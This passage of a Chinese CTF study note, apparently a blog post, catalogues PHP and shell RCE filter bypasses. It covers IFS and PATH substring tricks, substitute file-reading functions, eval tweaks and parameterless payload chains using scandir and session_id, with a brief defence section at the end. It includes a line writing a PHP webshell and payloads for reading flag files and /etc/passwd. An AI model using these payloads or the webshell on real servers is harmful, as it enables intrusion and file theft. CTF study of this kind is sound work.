+<td><strong>通配符展开</strong>：<code>*</code> 由 shell 展开成当前目录所有非隐藏文件名，<code>echo</code> 只负责打印</td>
+</tr>
+<tr>
+<td><code>printf &#39;%s\n&#39; *</code></td>
+<td>同上</td>
+<td>每个文件名单独一行，比 <code>echo *</code> 清爽</td>
+</tr>
+<tr>
+<td><code>for</code></td>
+<td><code>for f in *; do echo $f; done</code></td>
+<td>同样是 glob 展开驱动</td>
+</tr>
+</tbody></table>
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><table>
+<thead>
+<tr>
+<th>替代写法</th>
+<th>示例</th>
+<th>原理</th>
+<th>注意事项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$&#123;IFS&#125;</code></td>
+<td><code>cat$&#123;IFS&#125;flag</code></td>
+<td>展开成默认字段分隔符（含空格）</td>
+<td><strong>最常用</strong>；若后面紧跟字符要加隔断</td>
+</tr>
+<tr>
+<td><code>$IFS$9</code></td>
+<td><code>cat$IFS$9flag</code></td>
+<td><code>$IFS</code> + 空变量 <code>$9</code>，防止变量名粘连</td>
+<td><code>$1</code>~&#96;$9&#96; 未定义时为空，均可作隔断</td>
+</tr>
+<tr>
+<td><code>&#123;,&#125;</code> 花括号</td>
+<td><code>&#123;cat,flag&#125;</code></td>
+<td>bash 展开成 <code>cat /flag</code>，自动生成空格</td>
+<td><strong>仅 bash 支持</strong>，sh&#x2F;dash 无效</td>
+</tr>
+<tr>
+<td><code>&lt;</code> 重定向</td>
+<td><code>cat&lt;flag</code></td>
+<td><code>&lt;</code> 自带分隔能力，前后无需空格</td>
+<td>只适用于读文件场景</td>
+</tr>
+<tr>
+<td><code>&lt;&gt;</code> 重定向</td>
+<td><code>cat&lt;&gt;flag</code></td>
+<td>以读写方式打开文件</td>
+<td>对 <code>cat</code> 效果等同 <code>&lt;</code></td>
+</tr>
+<tr>
+<td>Tab（<code>%09</code>）</td>
+<td><code>cat%09flag</code></td>
+<td>Tab 也是合法空白字符</td>
+<td>HTTP 传参时用 URL 编码；过滤只查 0x20 时有效</td>
+</tr>
+<tr>
+<td>换行（<code>%0a</code>）</td>
+<td><code>cat%0aflag</code></td>
+<td>换行也是命令分隔符</td>
+<td>部分过滤不检查换行</td>
+</tr>
+<tr>
+<td>引号</td>
+<td><code>cat&#39;&#39;flag</code>、<code>cat&quot;&quot;flag</code></td>
+<td>空引号去除后产生分隔效果</td>
+<td>实际依赖 shell 解析顺序</td>
+</tr>
+</tbody></table>
+<h3 id="斜杠"><a href="#斜杠" class="headerlink" title="斜杠"></a>斜杠</h3><p>不带 <code>/</code>：<code>cat flag.txt</code> 读取<strong>当前目录</strong>下的 flag<br>带 <code>/</code>：<code>cat /flag.txt</code> 读取<strong>根目录</strong>下的 flag</p>
+<table>
+<thead>
+<tr>
+<th>替代写法</th>
+<th>示例</th>
+<th>原理</th>
+<th>注意事项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cd</code> 分段进入</td>
+<td><code>cd ..; cd ..; cat flag</code></td>
+<td>用相对路径逐层移动，全程不出现 <code>/</code></td>
+<td>需要知道目标在第几层</td>
+</tr>
+<tr>
+<td><code>cd</code> 后直接读</td>
+<td><code>cd /tmp; cat flag</code></td>
+<td>进入目标目录后用相对路径</td>
+<td>前提：能写出第一个带 <code>/</code> 的路径，或当前目录已接近目标</td>
+</tr>
+<tr>
+<td><code>$&#123;PATH:0:1&#125;</code></td>
+<td><code>cat$&#123;PATH:0:1&#125;flag</code></td>
+<td><code>$&#123;PATH&#125;</code> 首字符是 <code>/</code>，截取拼出斜杠</td>
+<td><strong>最通用</strong>；默认 PATH 以 <code>/</code> 开头</td>
+</tr>
+<tr>
+<td><code>$&#123;HOME:0:1&#125;</code></td>
+<td>同上等价</td>
+<td>用户家目录首字符通常是 <code>/</code></td>
+<td>root 用户是 <code>/root</code>，首字符也是 <code>/</code></td>
+</tr>
+<tr>
+<td><code>$&#123;PWD:0:1&#125;</code></td>
+<td>同上等价</td>
+<td>当前路径首字符</td>
+<td>需当前已在 <code>/</code> 下才成立</td>
+</tr>
+<tr>
+<td><code>$&#123;PATH:0:1&#125;</code> 拼完整路径</td>
+<td><code>cat$&#123;PATH:0:1&#125;bin$&#123;PATH:0:1&#125;cat</code></td>
+<td>拼出 <code>/bin/cat</code></td>
+<td>拼接变量较多时命令变长，注意可读性</td>
+</tr>
+<tr>
+<td><code>//</code> 变体</td>
+<td><code>cat //flag</code></td>
+<td>连续斜杠在 Linux 中等价于单斜杠</td>
+<td>过滤只禁单个 <code>/</code> 时无效，但可以用于某些宽松匹配场景</td>
+</tr>
+</tbody></table>
+<h1 id="函数の替换绕过"><a href="#函数の替换绕过" class="headerlink" title="函数の替换绕过"></a>函数の替换绕过</h1><p>如果 system 被 ban，或<code>disable_functions</code>禁了全部<strong>系统命令</strong>执行函数，或只需读 flag，不必真正 RCE，绕过思路一般围绕：<code>FFI</code>（PHP≥7.4）、FPM&#x2F;FastCGI 伪造、<code>mail+LD_PRELOAD</code>、纯 PHP 读文件，这里用 PHP 原生函数替换解决</p>
+<blockquote>
+<p> <strong><code>disable_functions</code> 禁止的不只是系统命令执行函数，它可以禁用几乎所有 PHP 内置函数，文件函数、网络函数、其他危险函数全都能 ban</strong>。</p>
+</blockquote>
+<h3 id="按行-整体读"><a href="#按行-整体读" class="headerlink" title="按行&#x2F;整体读"></a>按行&#x2F;整体读</h3><p>示例：CTFshow-web59:命令执行函数全ban，c&#x3D;ls报错查看目录，c&#x3D;highlight_file(“flag.php”); 直接读</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>file_get_contents($file)</code></td>
+<td>读整个文件，支持 <code>php://filter</code>、HTTP 等 wrapper</td>
+</tr>
+<tr>
+<td><code>file($file)</code></td>
+<td>读成数组（每行一个元素）</td>
+</tr>
+<tr>
+<td><code>readfile($file)</code></td>
+<td>读并直接输出到缓冲</td>
+</tr>
+<tr>
+<td><code>file_get_contents(&#39;php://filter/convert.base64-encode/resource=flag&#39;)</code></td>
+<td>编码读，绕过对输出的过滤</td>
+</tr>
+<tr>
+<td><code>highlight_file($file)</code> &#x2F; <code>show_source($file)</code></td>
+<td>带语法高亮输出源码</td>
+</tr>
+<tr>
+<td><code>file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php @eva1($_POST[]);?&gt;&#39;);</code></td>
+<td>✅👍直接传木马✅本人大力推荐👍✅</td>
+</tr>
+<tr>
+<td>木马注意引号，里面双外面单，里面单外面双，l &amp;1</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="流式读"><a href="#流式读" class="headerlink" title="流式读"></a>流式读</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>fopen($f,&#39;r&#39;) + fread/fgets/fgetc/fgetss</code></td>
+<td>经典文件流</td>
+</tr>
+<tr>
+<td><code>SplFileObject($f)</code></td>
+<td>迭代器逐行读，OOP 风格</td>
+</tr>
+<tr>
+<td><code>parse_ini_file($f)</code></td>
+<td>解析 ini 配置文件</td>
+</tr>
+</tbody></table>
+<h3 id="目录遍历类"><a href="#目录遍历类" class="headerlink" title="目录遍历类"></a>目录遍历类</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>scandir($dir)</code> &#x2F; <code>glob($pat)</code></td>
+<td>列目录</td>
+</tr>
+<tr>
+<td><code>opendir + readdir</code></td>
+<td>流式列目录</td>
+</tr>
+<tr>
+<td><code>DirectoryIterator</code> &#x2F; <code>FilesystemIterator</code></td>
+<td>SPL 目录迭代器</td>
+</tr>
+<tr>
+<td><code>dir($path)</code></td>
+<td>directory 类</td>
+</tr>
+</tbody></table>
+<h3 id="其他信息泄露函数（配合利用）"><a href="#其他信息泄露函数（配合利用）" class="headerlink" title="其他信息泄露函数（配合利用）"></a>其他信息泄露函数（配合利用）</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>phpinfo()</code></td>
+<td>泄露配置、环境变量、编译参数、绝对路径</td>
+</tr>
+<tr>
+<td><code>getenv($name)</code></td>
+<td>读环境变量（云上常泄露密钥）</td>
+</tr>
+<tr>
+<td><code>get_cfg_var($opt)</code></td>
+<td>读 php.ini 配置</td>
+</tr>
+<tr>
+<td><code>posix_*</code> 系列</td>
+<td><code>posix_getpwuid</code> 读 &#x2F;etc&#x2F;passwd</td>
+</tr>
+<tr>
+<td><code>get_defined_vars()</code> &#x2F; <code>get_defined_constants()</code></td>
+<td>审计场景看运行上下文</td>
+</tr>
+</tbody></table>
+<h3 id="协议包装器（配合读取-绕过）"><a href="#协议包装器（配合读取-绕过）" class="headerlink" title="协议包装器（配合读取&#x2F;绕过）"></a>协议包装器（配合读取&#x2F;绕过）</h3><table>
+<thead>
+<tr>
+<th>Wrapper</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php://filter</code></td>
+<td>编码转换读取任意文件（base64&#x2F;rot13 等）</td>
+</tr>
+<tr>
+<td><code>php://input</code></td>
+<td>原始 POST body，配合 <code>file_get_contents</code></td>
+</tr>
+<tr>
+<td><code>data://text/plain;base64,xxx</code></td>
+<td>内联数据当文件 include</td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td>phar 伪协议触发反序列化</td>
+</tr>
+<tr>
+<td><code>glob://</code></td>
+<td>跨 open_basedir 列举目录</td>
+</tr>
+</tbody></table>
+<h1 id="eval-场景内的细节绕过"><a href="#eval-场景内的细节绕过" class="headerlink" title="eval 场景内的细节绕过"></a>eval 场景内的细节绕过</h1><p>假设 sink 是 <code>eval($_GET[&#39;code&#39;].&#39;;&#39;)</code> 或类似，过滤若干”敏感元素”：</p>
+<h2 id="1-分号被禁-→-用-闭合"><a href="#1-分号被禁-→-用-闭合" class="headerlink" title="1. 分号被禁 → 用 ?&gt; 闭合"></a>1. 分号被禁 → 用 <code>?&gt;</code> 闭合</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);      <span class="comment">// 正常</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo()?&gt;&#x27;</span>);     <span class="comment">// ?&gt; 本身就能结束语句，不需要分号</span></span><br></pre></td></tr></table></figure>
+
+<p>因为 eval 把字符串当作”已打开<code>&lt;?php</code>“的代码段，<code>?&gt;</code>合法终止。进阶：<code>eval(&#39;?&gt;&#39;.$_GET[&#39;c&#39;])</code>让注入内容可以写纯 HTML&#x2F;其他标签。</p>
+<h2 id="2-echo-被禁-→-短标签"><a href="#2-echo-被禁-→-短标签" class="headerlink" title="2. echo 被禁 → 短标签"></a>2. <code>echo</code> 被禁 → 短标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>   <span class="comment">//&lt;?= ?&gt; 这种标签是 &lt;?php echo ?&gt; 的简写形式。</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 5.4 起 <code>&lt;?=</code> 不再受 <code>short_open_tag</code> 控制，永远可用——这是常被忽略的点。</p>
+<h2 id="3-GET-被关键字过滤"><a href="#3-GET-被关键字过滤" class="headerlink" title="3. $_GET 被关键字过滤"></a>3. <code>$_GET</code> 被关键字过滤</h2><ul>
+<li>换通道：<code>$_REQUEST</code>、<code>cookie</code>、<code>php://input</code>（配合 <code>file_get_contents</code>）</li>
+<li>构造变量名：<code>_GET</code> 四个字母可以用第一部分的异或&#x2F;自增手法拼出来再取变量</li>
+</ul>
+<h2 id="4-引号被禁-→-无引号传参"><a href="#4-引号被禁-→-无引号传参" class="headerlink" title="4. 引号被禁 → 无引号传参"></a>4. 引号被禁 → 无引号传参</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]);        <span class="comment">// 下标无引号，PHP 视作字符串常量 &#x27;a&#x27; &#x27;b&#x27;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>);       <span class="comment">// 如果连字母都禁，回到异或/自增</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5-关键字被禁-→-语义等价替换"><a href="#5-关键字被禁-→-语义等价替换" class="headerlink" title="5. 关键字被禁 → 语义等价替换"></a>5. 关键字被禁 → 语义等价替换</h2><table>
+<thead>
+<tr>
+<th align="left">禁</th>
+<th align="left">替</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>eval</code></td>
+<td align="left"><code>assert</code>（旧版）、可变函数、<code>create_function</code>（旧版）</td>
+</tr>
+<tr>
+<td align="left"><code>include</code></td>
+<td align="left"><code>require</code>、<code>include_once</code></td>
+</tr>
+<tr>
+<td align="left">直接调用</td>
+<td align="left"><code>call_user_func</code> &#x2F; 回调类函数动态化</td>
+</tr>
+<tr>
+<td align="left">函数名</td>
+<td align="left">字符串拼接拆散：<code>&#39;sys&#39;.&#39;tem&#39;</code></td>
+</tr>
+</tbody></table>
+<h2 id="6-一个常见误区"><a href="#6-一个常见误区" class="headerlink" title="6. 一个常见误区"></a>6. 一个常见误区</h2><p><code>ev/**/al</code>（注释拆关键字）在 <strong>PHP 本身不合法</strong>（词法分析后是两个标识符）。它只在一种情况下有效：<strong>过滤器先删注释再做匹配</strong>——删除后拼回 <code>eval</code>。所以这类手法是否可用，完全取决于过滤器的归一化顺序，不要盲目套用。</p>
+<h1 id="无参数RCE（eval）"><a href="#无参数RCE（eval）" class="headerlink" title="无参数RCE（eval）"></a>无参数RCE（eval）</h1><p>无参数 RCE<strong>大多只能读取文件，很难执行系统命令</strong>；属于 eval 代码注入的绕过方式，依然受<code>disable_functions</code>、<code>open_basedir</code>限制。场景：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$code = $_GET[&#x27;code&#x27;];</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[a-zA-Z0-9_\x7f-\xff]+\((?R)?\)/&#x27;, &#x27;&#x27;, $code))&#123;</span><br><span class="line">    eval($code);   // 只放行：无参数的函数调用，且参数也只能是同样的结构</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即只能写 <code>f(g(h()))</code> 这种零参数嵌套调用，不能传任何字符串、常量、数组。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># php常用内置无参函数：</span><br><span class="line">get_defined_vars()  -  返回由所有已定义变量所组成的数组</span><br><span class="line">phpinfo()  -  显示php详细内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="1、获取当前目录"><a href="#1、获取当前目录" class="headerlink" title="1、获取当前目录"></a>1、获取当前目录</h2><p><strong>核心原理</strong>：<code>scandir(&quot;.&quot;)</code>：扫描当前目录，返回文件数组:</p>
+<blockquote>
+<p>在 Linux 文件系统里：<code>.</code> &#x3D; 当前目录（相对路径）；<code>..</code> &#x3D; 上一级目录<br><code>scandir($path)</code>：传入目录路径，返回目录内所有文 件的数组</p>
+</blockquote>
+<p>一般需要先要打印出来查看当前目录内容，后面再选择哪一个数组，然后用读文件函数读取，常见打印函数：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>print_r()</td>
+<td>打印变量的信息，数组友好输出</td>
+<td>可打印字符串；适合看 scandir&#x2F;glob 返回的数组；只能输出，不能读取磁盘文件</td>
+</tr>
+<tr>
+<td>var_dump()</td>
+<td>打印变量类型与值，调试用</td>
+<td>输出更详细（类型 + 长度）；同样不能读取文件，仅打印内容</td>
+</tr>
+<tr>
+<td>echo</td>
+<td>输出一个或多个字符串</td>
+<td><strong>语言构造器不是函数</strong>，无参数 RCE 不能直接单独嵌套使用；普通 eval 常用<code>echo file_get_contents()</code></td>
+</tr>
+<tr>
+<td>print()</td>
+<td>输出字符串</td>
+<td>语言构造器，返回 1；只能输出字符串，不能处理数组；无参 RCE 不推荐</td>
+</tr>
+<tr>
+<td>var_export()</td>
+<td>输出变量可直接复用的 PHP 代码</td>
+<td>可输出数组，输出的内容是合法 PHP 代码；不能读取磁盘文件</td>
+</tr>
+</tbody></table>
+<p><strong>localeconv()</strong><br>1、无参调用，返回数组，数组第 1 个元素就是字符串 <code>.</code><br>2、搭配 <code>pos()</code> &#x2F; <code>current()</code> &#x2F; <code>reset</code> 取出 <code>.</code><br>3、<code>pos ()</code> 和 <code>current ()</code> 完全等价，取数组当前指针元素<br>4、<code>scandir(pos(localeconv()))</code>等价 <code>scandir(&quot;.&quot;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(loacleconv())))</span><br><span class="line">scandir() // 返回当前目录下的所有文件和目录名称（glob()可替换需要参数）的数组</span><br></pre></td></tr></table></figure>
+
+<p><strong>getcwd()</strong><br>1、无参直接返回<strong>当前目录绝对路径</strong>，例 <code>/var/www/html</code><br>2、直接当 scandir 参数：<code>scandir(getcwd())</code></p>
+<blockquote>
+<p>对比：<code>pos(localeconv())</code> 得到<code>.</code>相对路径；<code>getcwd()</code>得到绝对路径</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(getcwd()))</span><br><span class="line">getcwd()  // 直接获取当前目录绝对路径，不需要 `.`</span><br></pre></td></tr></table></figure>
+
+<p><strong>chr(46)</strong><br>1、chr(46) 就是字符 “.” ，构造46<br>2、rand()函数：返回一个随机数 chr(rand())   &#x2F;&#x2F;不实际，得看运气<br>3、chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于 “.”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(rand())   //不实际，得看运气 </span><br><span class="line">chr(time())   //所以一个周期必定出现一次 &quot;.&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>phpversion()</strong></p>
+<p>比较麻烦的方法一般少用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpversion()`返回PHP版本，如`5.5.9</span><br><span class="line">floor(phpversion())   返回 5</span><br><span class="line">sqrt(floor(phpversion()))   返回2.2360679774998</span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))   返回-2.1850398632615</span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))   返回4.5017381103491</span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))   返回45.081318677156</span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))   返回46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))   返回&quot;.&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>crypt()</strong></p>
+<p><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值，第一个字符随机是<code>$</code>(大概率) 或者 <code>&quot;.&quot;</code>(小概率) ，然后通过<code>chr(ord())</code>只取第一个字符，<code>ord()</code>函数可以返回字符的ASCII值，所以最后的payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(hebrevc(crypt(time()))))));  //还是概率事件，多尝试几次</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2、目录扫描函数："><a href="#2、目录扫描函数：" class="headerlink" title="2、目录扫描函数："></a>2、目录扫描函数：</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>scandir ($path)</code></td>
+<td>传入目录路径，返回目录内所有文件的数组</td>
+<td>示例返回：<code>[ &#39;.&#39;, &#39;..&#39;, &#39;index.php&#39;, &#39;flag.php&#39; ]</code>；无参调用默认等价 <code>scandir(&#39;.&#39;)</code></td>
+</tr>
+<tr>
+<td><code>glob($pattern)</code></td>
+<td>传入匹配规则，返回匹配成功的文件名数组</td>
+<td>无参调用默认等价<code>glob(&#39;*&#39;)</code>；**不返回<code>.</code>、<code>..</code>**；无法匹配<code>.</code>开头的隐藏文件</td>
+</tr>
+<tr>
+<td><code>opendir ($path)+readdir ()</code>组合</td>
+<td>opendir 打开目录资源，readdir 逐个读取文件名</td>
+<td>需要变量保存资源句柄，<strong>不适合无参数 RCE</strong>；普通 eval 场景可遍历目录</td>
+</tr>
+<tr>
+<td><code>DirectoryIterator($path)</code></td>
+<td>目录迭代器，遍历目录下文件</td>
+<td>需要<code>new</code>实例化对象，无参数 RCE 正则不支持 new，无参场景基本不可用</td>
+</tr>
+</tbody></table>
+<h2 id="3、数组处理函数："><a href="#3、数组处理函数：" class="headerlink" title="3、数组处理函数："></a>3、数组处理函数：</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>end($arr)</code></td>
+<td>数组指针移动到<strong>最后一个元素</strong>，取出该值</td>
+</tr>
+<tr>
+<td><code>reset($arr)</code></td>
+<td>数组指针重置，移回数组第一个元素</td>
+</tr>
+<tr>
+<td><code>next($arr)</code></td>
+<td>指针移动到下一个元素</td>
+</tr>
+<tr>
+<td><code>prev($arr)</code></td>
+<td>指针移动到上一个元素</td>
+</tr>
+<tr>
+<td><code>each()</code></td>
+<td>返回当前元素的键名和键值，并将内部指针向前移动</td>
+</tr>
+<tr>
+<td><code>pos()</code></td>
+<td>返回数组中的当前单元, 默认取第一个值</td>
+</tr>
+<tr>
+<td><code>current()</code></td>
+<td>读取数组的第一个元素</td>
+</tr>
+<tr>
+<td><code>array_reverse($arr)</code></td>
+<td>反转整个数组顺序，把末尾 flag 提到前面，方便 next () 提取</td>
+</tr>
+<tr>
+<td><code>array_flip($arr)</code></td>
+<td>交换数组的键和值</td>
+</tr>
+<tr>
+<td><code>array_rand($arr)</code></td>
+<td>随机返回数组其中一个元素；盲打不知道文件顺序时使用</td>
+</tr>
+</tbody></table>
+<p>假设数组有4个，<code>scandir()</code> 返回的固定前置两项永远是：<code>[ &#39;.&#39;, &#39;..&#39;, 文件1, flag.php ]</code>，不同情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、如果flag在第三个：</span><br><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"># 原数组：[ &#x27;.&#x27;, &#x27;..&#x27;, &#x27;flag.php&#x27;, &#x27;index.php&#x27; ]</span><br><span class="line"># 反转后：[ &#x27;index.php&#x27;, &#x27;flag.php&#x27;, &#x27;..&#x27;, &#x27;.&#x27; ]</span><br><span class="line">2、如果flag在第四个：</span><br><span class="line">highlight_file(end(scandir(pos(localeconv()))));</span><br><span class="line">3、flag基本不会直接出现在前俩</span><br><span class="line">4、其它读取非第一二方法：</span><br><span class="line"># array_rand(array_flip())，array_flip()是交换数组的键和值，array_rand()函数返回数组中的随机键名</span><br><span class="line">var_dump(array_rand(array_flip(scandir(current(localeconv())))));        //返回文件名</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));  //读取文件</span><br><span class="line">（这些读取文件的payload都可以自己结合前面总结的构造&quot;.&quot;的方法切合实际过滤情况读取)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4、文件读取函数（payload-最外层，输出-flag）"><a href="#4、文件读取函数（payload-最外层，输出-flag）" class="headerlink" title="4、文件读取函数（payload 最外层，输出 flag）"></a>4、文件读取函数（payload 最外层，输出 flag）</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>highlight_file()</code> &#x2F; <code>show_source()</code></td>
+<td>高亮输出文件源码</td>
+<td><strong>首选</strong>，读取 php 文件不会执行里面 php 代码</td>
+</tr>
+<tr>
+<td><code>readfile()</code></td>
+<td>直接输出文件全部内容</td>
+<td>也可用来读取 flag</td>
+</tr>
+<tr>
+<td><code>readgzfile()</code></td>
+<td>也可读文件</td>
+<td>也可读文件，常用于绕过过滤</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p> <code>file_get_contents</code>：需要 echo 输出，嵌套写法麻烦，无参场景极少使用</p>
+</blockquote>
+<h1 id="无参数RCE（session）"><a href="#无参数RCE（session）" class="headerlink" title="无参数RCE（session）"></a>无参数RCE（session）</h1><p>目录遍历路线（<code>scandir/glob</code>）依赖目录扫描函数，如果<code>scandir</code>、<code>glob</code>都被<code>disable_functions</code>禁用，目录遍历方案直接失效，就用<strong>session 路线</strong>，不需要扫描目录，不用 scandir、glob、数组处理函数，直接自定义文件名。</p>
+<p><strong>使用条件</strong>：当请求头中有cookie时（或者自己手动添加cookie头也行）<br><strong>原理核心</strong>：<br>1、session_start()：开启 PHP 会话，初始化 session；<br>2、<code>session_id()</code>：读取当前 Session 的 ID 字符串；<br>3、PHPSESSID 的值由请求 Cookie 可控，我们抓包修改请求头 Cookie 里PHPSESSID&#x3D;flag.php；<br>4、<code>session_id()</code>就会返回我们设置的字符串<code>flag.php</code>；<br>5、把<code>session_id()</code>的返回值，直接传给文件读取函数<code>highlight_file()</code>，实现读取文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<p><strong>逐层拆解</strong>：<br>1、<code>session_start()</code>：开启 session，返回布尔值<code>true</code>；<br>2、<code>session_id()</code>：读取 Cookie 里<code>PHPSESSID</code>的值；<br>3、<code>highlight_file(&quot;flag.php&quot;)</code>：读取文件。</p>
+<blockquote>
+<p>注意：<code>session_start()</code>返回 true，但作为 session_id 参数时，session_id () 不带参数读取当前会话 id，PHP 特性。</p>
+</blockquote>
+<p><strong>使用步骤</strong>：<br>1、提交 payload：<code>?code=highlight_file(session_id(session_start()));</code><br>2、抓包，在 HTTP 请求 Cookie 添加：<code>PHPSESSID=flag.php</code><br>3、发送请求 → <code>session_id()</code>返回<code>flag.php</code>，读取 flag 文件。</p>
+<blockquote>
+<p>如果想读取其他文件，只需要修改 Cookie 里 PHPSESSID 的值： PHPSESSID&#x3D;etc&#x2F;passwd → <code>highlight_file(&#39;etc/passwd&#39;)</code></p>
+</blockquote>
+<p><strong>关键特性 &amp; 考点</strong><br>1、可以自定义任意字符串，目录遍历只能列出当前目录已有文件；session 路线你想传入什么文件名，直接改 Cookie 的 PHPSESSID 即可。<br>2、不受 scandir&#x2F;glob 禁用影响 当<code>scandir</code>、<code>glob</code>全部被 ban，目录遍历路线废掉，session 路线是首选兜底方案。<br>3、有长度 &#x2F; 字符限制 PHPSESSID<br>4、默认只能是字母、数字，部分环境不允许<code>/</code>，此时无法读取绝对路径文件，只能读取当前目录文件。（部分 php.ini 配置限制 sessionid 字符集，不能用<code>/</code>、<code>.</code>以外特殊字符，这是最常见坑。）<br>5、函数同样受<code>disable_functions</code>管控 如果<code>session_start()</code>、<code>session_id()</code>被禁用，这条路线直接失效。<br>6、受<code>open_basedir</code>限制 就算拿到字符串<code>/etc/passwd</code>，open_basedir 拦截的话依然读不了。</p>
+<hr>
+<h1 id="考虑一下："><a href="#考虑一下：" class="headerlink" title="考虑一下："></a>考虑一下：</h1><p>除上述绕过方式之外，还有：查看读取上级&#x2F;根目录文件、glob伪协议查看文件、<strong>请求头无参数RCE、全局变量无参数RCE、无字母RCE（system）、bashfuck实现无字母RCE、eval中无数字字母RCE(冲破限制)、利用linux的$(())构造出数字、环境变量绕过</strong>等等。</p>
+<p>部分可见我学长【@wanth3f1ag】以及大佬的文章【离别歌】，附在文末了。</p>
+<p>想了一下还是分成两部分之后更新吧，这些绕过方式相对前面基础无参数 RCE、session 无参 RCE 来说，这些属于偏冷门、进阶考点，CTF 里出现频率更低，之后再单独补充吧。</p>
+<hr>
+<h1 id="RCE的防护"><a href="#RCE的防护" class="headerlink" title="RCE的防护"></a>RCE的防护</h1><p>简单提一提防护以及现状。</p>
+<h2 id="1-代码层（根源防护，最重要）"><a href="#1-代码层（根源防护，最重要）" class="headerlink" title="1. 代码层（根源防护，最重要）"></a>1. 代码层（根源防护，最重要）</h2><p>1、尽量不使用危险执行函数** PHP：避免 eval、assert、system、shell_exec、exec、passthru、可变函数调用。</p>
+<blockquote>
+<p>php.ini <code>disable_functions</code> 禁用高危函数，抑制 RCE 利用。</p>
+</blockquote>
